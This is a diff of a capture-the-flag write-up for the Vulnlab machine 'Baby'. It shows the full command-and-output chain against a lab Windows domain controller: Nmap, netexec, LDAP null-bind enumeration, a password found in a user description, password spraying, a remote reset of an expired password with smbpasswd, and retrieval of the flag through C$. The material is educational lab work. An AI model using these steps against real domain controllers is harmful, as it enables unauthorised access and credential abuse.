@@ -1,13 +1,17 @@
 ---
-title: "Baby Walkthrough"
+title: "Baby Walkthrough: Enumerating SMB and LDAP on Windows Server 2022"
 date: 2024-10-02 14:06:00 +0530
 categories: [Capture the Flags, Windows]
-tags: [vulnlab]     # TAG names should always be lowercase
+tags: [vulnlab]   
 description: "Walkthrough of Vulab's Machine Baby"
 ---
 
 
-Started with a standard NMAP scan to discover open ports. 
+## Introduction
+This walkthrough demonstrates how to compromise a lab machine named "Baby" from Vulnlab by enumerating services like SMB and LDAP on a Windows Server 2022 Domain Controller (DC). The goal is to perform network scanning, domain enumeration, password cracking, and ultimately gain unauthorized access.
+
+## Network Scanning with 
+I started with a standard Nmap scan to discover open ports:
 ```
 sudo nmap 10.10.75.4 -sS -n --disable-arp-ping --top-ports=1000 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 09:43 EDT
@@ -29,7 +33,23 @@ PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
 5357/tcp open  wsdapi
 ```
-I can see SMB port is open for connections, enumerated further using smbclient as shown below
+### Nmap Flags:
+- **`-sS`**: Performs a SYN scan (stealth scan).
+- **`-n`**: Disables DNS resolution to speed up scanning.
+- **`--disable-arp-ping`**: Skips ARP ping.
+- **`--top-ports=1000`**: Scans the top 1000 commonly used ports.
+
+### Key Observations:
+- Port 139/445: SMB service (Windows shares).
+- Port 389/636: LDAP (Lightweight Directory Access Protocol).
+- Port 3268/3269: Global Catalog (LDAP for domain replication).
+- Port 88: Kerberos (authentication service).
+
+---
+## SMB Enumeration with Netexec
+
+Next, I enumerated the SMB shares and host details using Netexec (a continuation of Crackmapexec). This tool automates multi-protocol enumeration.
+
 ```
 netexec smb 10.10.75.4
 [*] First time use detected
@@ -53,11 +73,14 @@ netexec smb 10.10.75.4
 [*] Copying default configuration file
 SMB         10.10.75.4      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
 ```
-It appears to be DC has been exposed. Checking if there’s a possibility for Domain Enumeration
+From this, we can identify the machine name (BABYDC), the domain (baby.vl), and other important information, such as SMBv1 being disabled.
 
-Tried using “powerview”, it didn’t work. As we can see, the ports “389” and “636” is open which are default ports for LDAP. One can leverage LDAPSearch to enumerate further.
+---
 
-Since we don’t have credentials for the AD “baby.vl”, we can use null credentials to verify if we can access the data as shown below
+## LDAP Enumeration Using Null Bind
+
+Since LDAP ports (389/636) were open, I attempted domain enumeration using LDAP null binding (authentication without credentials).
+
 
 ```
 ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "DC=baby,DC=vl" | grep "distinguishedName" 
@@ -86,8 +109,7 @@ distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
 distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
 distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
 ```
-
-People could leave passwords in the description as shown below
+Since the server is accepting **NULL Credentials**, we can further enumerate the descriptions of various objects to uncover any interesting information. Sometimes, people leave sensitive information such as passwords in these descriptions. Here's an example:
 ```
 ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "CN=Teresa Bell,OU=it,DC=baby,DC=vl"
 # extended LDIF
@@ -146,7 +168,7 @@ result: 0 Success
 # numResponses: 2
 # numEntries: 1
 ```
-Tried RDP with the potential obtained password, it didn’t work for “teresa.bell@baby.vl”. Alternatively we can check if this password used for other users. Enumerating email address as shown below
+Tried RDP with the potential obtained password, it didn’t work for “teresa.bell@baby.vl”. I decided to check if the same password might be used for other users on the system. To find more users, I enumerated their **email addresses** as follows:
 ```
 ldapsearch -x -H ldap://10.10.75.4 -D '' -w '' -b "DC=baby,DC=vl" | grep "userPrincipalName"
 userPrincipalName: Jacqueline.Barnett@baby.vl
@@ -160,9 +182,9 @@ userPrincipalName: Teresa.Bell@baby.vl
 # Caroline Robinson, it, baby.vl
 dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
 ```
-There’s no principal name associated with “Caroline Robinson”, which standout’s from these.
+One interesting user stood out from the list: **Caroline Robinson**, who doesn’t have a **userPrincipalName** associated.
+Since I now had a username and password, I decided to validate the credentials using "netexec"
 
-There’s a tool named netexec, which is a continuation of Crackmapexec. If any credentials, such as a username and password, are found during enumeration, Crackmapexec verifies their validity. Since we have username and password, we could use the same to validate credentials via SMB.
 ```
 netexec smb 10.10.75.4 -u emails.txt -p 'BabyStart123!'                          
 SMB         10.10.75.4      445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
@@ -178,7 +200,9 @@ SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Connor.Wilkinson
 SMB         10.10.75.4      445    BABYDC           [-] baby.vl\it:BabyStart123! STATUS_LOGON_FAILURE 
 SMB         10.10.75.4      445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
 ```
-Since there’s a “STATUS_PASSWORD_MUST_CHANGE”, one cannot simply login with the compromised password. Tried logging into rdp, unfortunately it didn’t get through. Resetting an Expired Password Remotely – n00py Blog - Leveraged the tool “smbpasswd” in-built kali linux tool to reset the password as shown below
+Since there was a **STATUS_PASSWORD_MUST_CHANGE** error during previous attempts, logging in with the compromised password directly was not possible. Attempts to log in via **RDP** also failed. 
+To bypass the password expiration issue, I used the **smbpasswd** tool, which is available on Kali Linux, to reset the password for **Caroline Robinson**.
+## Resetting an Expired Password Remotely
 ```
 smbpasswd -r 10.10.75.4 -U "Caroline.Robinson"
 Old SMB password:
@@ -186,9 +210,10 @@ New SMB password:
 Retype new SMB password:
 Password changed for user Caroline.Robinson
 ```
-There was a break and resumed the pwning with the new machine IP “10.10.88.2”. 
+After a break, I resumed enumeration on a new machine with the IP **10.10.88.2**.
 
-Listing SMB shares by authenticating to DC using compromised credentials as show below
+### Listing SMB Shares
+Using the newly reset credentials, I attempted to list available **SMB** shares on the domain controller.
 ```
 smbclient -U 'Caroline.Robinson%Password123' -L //10.10.88.2/Admin$
 
@@ -203,9 +228,23 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.88.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
 ```
-Connecting to the shares, no luck for ADMIN$ but able to connect C$ as shown below
+## Attempting to Connect to Shares
+The available shares are **ADMIN$**, **C$**, **IPC$**, **NETLOGON**, and **SYSVOL**. Unfortunately, I could not connect to **ADMIN$** due to an error.
 ```
 smbclient -U 'Caroline.Robinson' \\\\10.10.88.2\\ADMIN$ 
 Password for [WORKGROUP\Caroline.Robinson]:
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
+Able to connect to C$ 
+![alt text](assets/img/image.png)
+
+## Fetching the flag
+After gaining access to the **C$** share, I navigated to the **user's Desktop folder** to look for any files of interest. Inside **Caroline Robinson's Desktop** folder, I found a file named **user.txt** which contained the flag.
+```
+smb: \users\Caroline.Robinson\Desktop\> get user.txt
+getting file \users\Caroline.Robinson\Desktop\user.txt of size 36 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+```
+
+## References
+- [Exploiting LDAP Server NULL Bind](https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/#:~:text=Exploiting%20LDAP%20Server%20NULL%20Bind.%20February%205,%202020%20n00py.%20Exploit)
+- [Resetting Expired Passwords Remotely](https://www.n00py.io/2021/09/resetting-expired-passwords-remotely/#:~:text=Doing%20a%20password%20spray%20and%20hit%20valid%20creds%20but%20get)
